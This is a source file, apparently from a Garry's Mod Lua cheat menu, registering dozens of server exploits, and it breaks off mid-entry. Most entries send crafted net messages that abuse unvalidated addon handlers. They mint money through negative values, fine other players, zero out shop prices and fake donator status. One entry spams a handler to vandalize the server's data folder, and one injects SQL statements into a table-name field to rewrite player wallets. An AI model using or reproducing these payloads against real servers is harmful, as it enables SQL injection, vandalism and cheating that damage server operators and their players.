    desc = "Become a triathlon runner",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    prevalidated = true,
    scan = function() return KV.ValidNetString("StaminaDrowning") and KV.GetLP().BurgerStamina ~= nil and KV.GetLP().BurgerMaxStamina ~= nil end,
    hooks = {
        CreateMove = function()
            KV.GetLP().BurgerStamina = KV.GetLP().BurgerMaxStamina
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Movement Exploit", {
    desc = "Become a triathlon runner",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return isfunction(StopSprint) and KV.GetLP():GetNWInt("stamina", false) ~= false end,
    vars = {
        stamina = 0
    },
    hooks = {
        Tick = function(tbl, sploit)
            KV.GetLP():SetNWInt("stamina", math.huge)
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Vandalize Server Data", {
    desc = "Vandalize the servers data folder, probably won't do any real damage but will annoy their devs",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return KV.ValidNetString("WriteQuery") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "WriteQuery")
            net.WriteString("BUY ODIUM.PRO" .. string.rep("!", math.random(1, 50)))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give people a crapton of money",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("SendMoney") and net.Receivers["confpanel"] end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("shekels1_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "SendMoney")
                    net.WriteEntity(v)
                    net.WriteEntity(v)
                    net.WriteEntity(v)
                    net.WriteString(tostring(-KV.SafeToNumber(KV.GetStored("shekels1"))))
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "shekels1_plyz"
        },
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels1"
        },
        {
            typ = "func",
            Name = "Give shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("BailOut") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "BailOut")
            net.WriteEntity(KV.GetLP())
            net.WriteEntity(KV.GetLP())
            net.WriteFloat(-KV.SafeToNumber(KV.GetStored("shekels2")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels2"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("casinokit_chipexchange") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            local moneylog = KV.GetLP():getDarkRPVar("money")
            KV.NetStart(sploit, "casinokit_chipexchange")
            net.WriteEntity(KV.GetLP())
            net.WriteString("darkrp")
            net.WriteBool(true)
            net.WriteUInt(KV.GetLP():getDarkRPVar("money"), 32)
            net.SendToServer()

            for i = 1, 10 do
                KV.NetStart(sploit, "casinokit_chipexchange")
                net.WriteEntity(KV.GetLP())
                net.WriteString("darkrp")
                net.WriteBool(false)
                net.WriteUInt(moneylog * 0.10, 32)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("hitcomplete") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "hitcomplete")
            net.WriteDouble(KV.GetStored("shekels4"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels4"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("WithdrewBMoney") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "WithdrewBMoney")
            net.WriteInt(KV.GetStored("shekels5"), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 50000,
            default = 1000,
            addr = "shekels5"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("ClickerAddToPoints") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ClickerAddToPoints")
            net.WriteInt(KV.GetStored("shekels6"), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = (math.pow(2, 32) - 1) / 2,
            default = 1000,
            addr = "shekels6"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("ckit_roul_bet") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ckit_roul_bet")
            net.WriteEntity(KV.GetLP())
            net.WriteString("")
            net.WriteString("")
            net.WriteUInt(-KV.SafeToNumber(KV.GetStored("shekels7")), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = math.pow(2, 16) - 1,
            default = 1000,
            addr = "shekels7"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("duelrequestguiYes") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "duelrequestguiYes")
            net.WriteInt(0xFFFFFFFF, 32)
            net.WriteEntity(table.Random(player.GetAll()))
            net.WriteString("Crossbow")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("pplay_sendtable", "pplay_deleterow") and cl_PPlay and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("shekels2_plyz", {})) do
                if IsValid(v) then
                    local ass = {}
                    ass.tblname = "darkrp_player; UPDATE darkrp_player SET wallet = " .. KV.SafeToNumber(KV.GetStored("shekels9")) .. " WHERE uid = " .. v:SteamID64() .. "; UPDATE darkrp_player SET wallet " .. KV.SafeToNumber(KV.GetStored("shekels9")) .. " WHERE uid = " .. v:UniqueID()
                    ass.ply = v
                    KV.NetStart(sploit, "pplay_sendtable")
                    net.WriteTable(ass)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "shekels2_plyz"
        },
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels9"
        },
        {
            typ = "func",
            Name = "Give shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Effectiveness varies server to server",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("RevivePlayer") and KV.GetLP().getDarkRPVar end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = KV.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)

            if r_tbl.cooldown == 0 then
                r_tbl.cooldown = KV.REAL_CURTIME + KV.SafeToNumber(KV.GetStored("shekels10"))
            end

            KV.NetStart(sploit, "RevivePlayer")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Cooldown",
            min = 1,
            max = 300,
            default = 60,
            addr = "shekels10"
        },
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give people a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("75_plus_win") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("shekels11_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "75_plus_win")
                    net.WriteString(KV.GetStored("shekels11"))
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "shekels11_plyz"
        },
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels11"
        },
        {
            typ = "func",
            Name = "Give shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("ATMDepositMoney") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "ATMDepositMoney")
            net.WriteFloat(-KV.GetStored("shekels12"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels12"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("SellMinerals", "Upgrade") end,
    hooks = {
        Think = function(tbl, sploit)
            if SkillDB and istable(SkillDB) then
                for k1, v1 in pairs(SkillDB) do
                    if not (v1.iSkill == true) then
                        KV.NetStart(sploit, "SetUpgrade")

                        net.WriteTable({
                            LuaName = v1.LuaName,
                            Amount = KV.GetStored("shekels13")
                        })

                        net.SendToServer()
                        KV.NetStart(sploit, "SellMinerals")

                        net.WriteTable({
                            Target = KV.GetLP()
                        })

                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "shekels13_plyz"
        },
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = 100000,
            default = 1000,
            addr = "shekels13"
        },
        {
            typ = "func",
            Name = "Give shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("TakeBetMoney") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "TakeBetMoney")

            net.WriteTable({KV.SafeToNumber(KV.GetStored("shekels14")), KV.SafeToNumber(KV.GetStored("shekels14"))})

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "shekels14"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("kart_sell") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "kart_sell")
            net.WriteString("sw_gokart")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Fine other players for free money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("tickbooksendfine") end,
    hooks = {
        Think = function(tbl, sploit)
            local ply_tbl = KV.GetStored("shekels17_plyz", {})

            local max_dist = KV.RecursiveGetVar(TicketBook, {"Config", "TB", "MaxDistance"}, "number")

            if max_dist then
                ply_tbl = ents.FindInSphere(KV.GetLP():GetPos(), max_dist)
            end

            for k, v in ipairs(ply_tbl) do
                local t = KV.GetStored("shekels17_plyz", {})

                if table.HasValue(t, v) then
                    KV.NetStart(sploit, "tickbooksendfine")
                    net.WriteString(v:SteamID())

                    net.WriteTable({KV.GetStored("shekels17r", "GET KV-MENU")})

                    net.WriteDouble(KV.SafeToNumber(KV.GetStored("shekels17", 1500)), 32)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "shekels17_plyz"
        },
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = KV.RecursiveGetVar(TicketBook, {"Config", "Fine", "Max"}, "number") or 5000,
            default = 1000,
            addr = "shekels17"
        },
        {
            typ = "string",
            Name = "Fine Reason",
            default = "GET KV-MENU",
            addr = "shekels17r"
        },
        {
            typ = "bool",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("hhh_request") end,
    hooks = {
        Think = function(tbl, sploit)
            local hitRequest = {
                hitman = KV.GetLP(),
                requester = KV.GetLP(),
                target = table.Random(player.GetAll()),
                reward = KV.SafeToNumber(KV.GetStored("shekels18", 1500))
            }

            KV.NetStart(sploit, 'hhh_request')
            net.WriteTable(hitRequest)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "shekels18"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Ez money",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("DaHit") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "DaHit")
            net.WriteFloat(-KV.SafeToNumber(KV.GetStored("shekels19", 1500)))
            net.WriteEntity(KV.GetLP())
            net.WriteEntity(KV.GetLP())
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "shekels19"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Just a Taxi Driver trying to make an honest living",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NET_EcSetTax") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NET_EcSetTax")
            net.WriteInt(KV.GetStored("shekels21", 1000), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = (math.pow(2, 16) - 1) / 2,
            default = 1000,
            addr = "shekels21"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Just an Irish Farmer trying to make an honest living",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("FARMINGMOD_ADDITEM", "FARMINGMOD_SELLITEM") end,
    hooks = {
        Think = function(tbl, sploit)
            local tbl = {}

            local r_tbl = KV.RecursiveGetVar(_G, {"FARMINGMOD", "crops"}, "table")

            if r_tbl then
                for _, crop in pairs(r_tbl) do
                    if crop.sell and not tbl.sell or crop.sell > tbl.sell then
                        tbl = crop
                    end
                end

                local quantity = (KV.GetStored("shekels22", 1000) / tbl.sell) + 1
                local recurse = math.Round(quantity / ((math.pow(2, 16) - 1) / 2))

                for i = 0, recurse do
                    if recurse > 1 then
                        quantity = quantity - ((math.pow(2, 16) - 1) / 2)
                    end

                    local quant = math.Clamp(quantity, 1, (math.pow(2, 16) - 1) / 2)
                    KV.NetStart(sploit, "FARMINGMOD_ADDITEM", true)
                    net.WriteTable(tbl)
                    net.WriteInt(quant, 16)
                    net.SendToServer()
                    KV.NetStart(sploit, "FARMINGMOD_SELLITEM", true)
                    net.WriteTable(tbl)
                    net.WriteInt(quant, 16)
                    net.SendToServer()
                end
            else
                sploit.status = 3
            end
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "shekels22"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Inverse the polarity of the servers moral compass",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 6,
        ["Total"] = 6,
    },
    scan = function() return KV.DynamicNetString("credit_") and net.Receivers["credit_gui_loan"] end,
    hooks = {
        net = {
            WriteDouble = function(sploit, varargs)
                local CMOD_Messages = {
                    ["credit_"] = true,
                }

                for k, v in pairs(CMOD_Messages) do
                    if sploit.bools.enabled and KV.NetOutgoingMsg and KV.NetOutgoingMsg:find(k) then
                        varargs[1] = -varargs[1]
                        break
                    end
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Show the server your empty wallet and see if it feels guilty",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    count = {
        ["Active"] = 1,
        ["Total"] = 1,
    },
    scan = function() return KV.ValidNetString("lp2PrinterCart") end,
    hooks = {
        util = {
            TableToJSON = function(sploit, varargs)
                if varargs[1].fullPrice and sploit.bools.freeprint then
                    varargs[1].fullPrice = 0
                    --varargs[1].product1 = "worldspawn"
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
            ToggleText = {"Free Printers"},
            border = true,
            bool = "freeprint"
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Pay your negative debts",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("FOC_ClaimPay") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "FOC_ClaimPay")
            net.WriteInt(KV.GetStored("shekels23", 1000), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Amount",
            min = 1,
            max = (math.pow(2, 32) - 1) / 2,
            default = 1000,
            addr = "shekels23"
        },
        {
            typ = "func",
            Name = "Give me shekels",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Pickpocket repeater",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("fixg") end,
    hooks = {
        Think = function(tbl, sploit)
            if IsValid(KV.GetLP():GetNW2Entity("rgg")) then
                KV.NetStart(sploit, "fixg")
                net.WriteEntity(KV.GetLP():GetNW2Entity("rgg"))
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "It would appear that crime does pay",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("dialogReward") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "dialogReward")
            net.WriteInt(KV.GetStored("scpmx_money", 1000), 32)
            net.WriteInt(KV.GetStored("scpmx_points", 1000), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Money",
            min = 1,
            max = (math.pow(2, 32) - 1) / 2,
            default = 1000,
            addr = "scpmx_money"
        },
        {
            typ = "float",
            Name = "Points",
            min = 1,
            max = (math.pow(2, 32) - 1) / 2,
            default = 1000,
            addr = "scpmx_points"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Buy currency with your mothers credit card",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PurchaseGun") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "PurchaseGun")
            net.WriteInt(KV.GetStored("scpmx2_money", 1000), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Money",
            min = 1,
            max = (math.pow(2, 16) - 1) / 2,
            default = 1000,
            addr = "scpmx2_money"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Rob the server bank",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("popupgivereward") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "popupgivereward")
            net.WriteInt(KV.GetStored("scpmx3_money", 1), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Days",
            min = 1,
            max = 7,
            default = 1,
            addr = "scpmx3_money"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Win the lottery",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("PurchaseAmmo") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "PurchaseAmmo")
            net.WriteInt(KV.GetStored("scpmx4_money", 1000), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Money",
            min = 1,
            max = math.floor((math.pow(2, 16) - 1) / 2),
            default = 1000,
            addr = "scpmx4_money"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "Man these negative taxes sure are great!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("givemoneyonetime") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "givemoneyonetime")
            net.WriteString(-tonumber(KV.GetStored("mx24", 1000)))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Money",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "mx24"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Money Exploit", {
    desc = "It's tax collection day and you've earned negative money this year!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("take_my_cash") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "take_my_cash")
            net.WriteString(-tonumber(KV.GetStored("mx24", 1000)))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Money",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "mx24"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Points Exploit", {
    desc = "PacMan would disapprove (causes server-side errors, only sometimes works)",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("IntercomPlay") end,
    hooks = {
        Think = function(tbl, sploit)
            for i = 0, tonumber(KV.GetStored("scpmx5_points", 1000)) do
                KV.NetStart(sploit, "IntercomPlay")
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Points",
            min = 1,
            max = math.huge,
            default = 1000,
            addr = "scpmx5_points"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Donator Exploit", {
    desc = "Become a Pay2Win player for free",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("createvalue") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "createvalue")
            net.WriteString("donatelevel")
            net.WriteInt(KV.GetStored("donate1", 6), 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Level",
            min = 1,
            max = (math.pow(2, 16) - 1) / 2,
            default = 6,
            addr = "donate1"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Inventory Exploit", {
    desc = "Buy any item (even donator/admin restricted)",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function()
        return KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") ~= false or KV.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") ~= false or KV.RecursiveGetVar(_G, {"FISHINGMOD"}, "table") ~= false
    end,
    count = {
        ["Active"] = 0,
        ["Total"] = 3,
    },
    initial = function(sploit)
        if sploit.count.Active == 0 then
            local CMOD_Messages = {
                ["CRAFTINGMOD"] = true,
                ["FARMINGMOD"] = true,
                ["FISHINGMOD"] = true,
            }

            for k, v in pairs(CMOD_Messages) do
                if KV.DynamicNetString(k) then
                    sploit.count.Active = sploit.count.Active + 1
                end
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if tbl[1] == 1 then
                local CMOD = KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table")

                if CMOD then
                    KV.Menu:SetVisible(false)
                    local buy_tbl = {}

                    for k, v in pairs(CMOD) do
                        if KV.ValidTable(v) and v.LIST then
                            for k2, v2 in pairs(v.LIST) do
                                if v2.BUY then
                                    if not v2.MODEL then
                                        v2.MODEL = "models/error.mdl"
                                    end

                                    table.insert(buy_tbl, v2)
                                end
                            end
                        end
                    end

                    CMOD.PANELS.Shop_ = buy_tbl
                    CMOD.PANELS.Shop_Entity = ents.FindByClass("CRAFTINGMOD_SHOP")[1] or Entity(0)
                    CMOD.PANELS:CreateShop()
                end
            elseif tbl[1] == 2 then
                local Shop = KV.RecursiveGetVar(_G, {"FARMINGMOD", "Shop"}, "function")

                if Shop then
                    Shop(FARMINGMOD)
                    KV.Menu:SetVisible(false)
                end
            elseif tbl[1] == 3 then
                local Shop = KV.RecursiveGetVar(_G, {"FISHINGMOD", "Menu", "CreateShop"}, "function")

                if Shop then
                    Shop(FISHINGMOD.Menu)
                    KV.Menu:SetVisible(false)
                end
            end
        end,
        net = {
            WriteTable = function(sploit, varargs)
                if istable(varargs[1]) then
                    for k, v in pairs(varargs[1]) do
                        if isfunction(v) then
                            varargs[1][k] = nil
                        end
                    end
                end
            end,
        },
    },
    functions = {
        {
            typ = "func",
            Name = "Mining Shop",
            args = {1},
            required = KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") ~= false
        },
        {
            typ = "func",
            Name = "Farming Shop",
            args = {2},
            required = KV.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") ~= false
        },
        {
            typ = "func",
            Name = "Fishing Shop",
            args = {3},
            required = KV.RecursiveGetVar(_G, {"FISHINGMOD"}, "table") ~= false
        },
    },
})

KV.AddExploit("Inventory Exploit", {
    desc = "Inverse the polarity of the servers moral compass",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 0,
        ["Total"] = 9,
    },
    scan = function() return KV.DynamicNetString("CRAFTINGMOD") or KV.DynamicNetString("FARMINGMOD") or KV.DynamicNetString("FISHINGMOD") end,
    initial = function(sploit)
        if sploit.count.Active == 0 then
            local CMOD_Messages = {
                ["CRAFTINGMOD"] = true,
                ["FARMINGMOD"] = true,
                ["FISHINGMOD"] = true,
            }

            for k, v in pairs(CMOD_Messages) do
                if KV.DynamicNetString(k) then
                    sploit.count.Active = sploit.count.Active + 3
                end
            end
        end
    end,
    hooks = {
        net = {
            WriteInt = function(sploit, varargs)
                local CMOD_Messages = {
                    ["CRAFTINGMOD"] = true,
                    ["FARMINGMOD"] = true,
                    ["FISHINGMOD"] = true,
                }

                for k, v in pairs(CMOD_Messages) do
                    if sploit.bools.enabled and KV.NetOutgoingMsg and KV.NetOutgoingMsg:find(k) then
                        varargs[1] = -varargs[1]
                        break
                    end
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Inventory Exploit", {
    desc = "Convince the NPCs that you're a worthy charity",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    count = {
        ["Active"] = 2,
        ["Total"] = 2,
    },
    scan = function() return KV.DynamicNetString("BuyFromShopNPC") end,
    hooks = {
        net = {
            WriteTable = function(sploit, varargs)
                if sploit.bools.enabled and istable(varargs[1]) and varargs[1].price and KV.NetOutgoingMsg and KV.NetOutgoingMsg:find("BuyFromShopNPC") then
                    varargs[1].price = 0
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Vehicle Exploit", {
    desc = "Give yourself a preset car",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
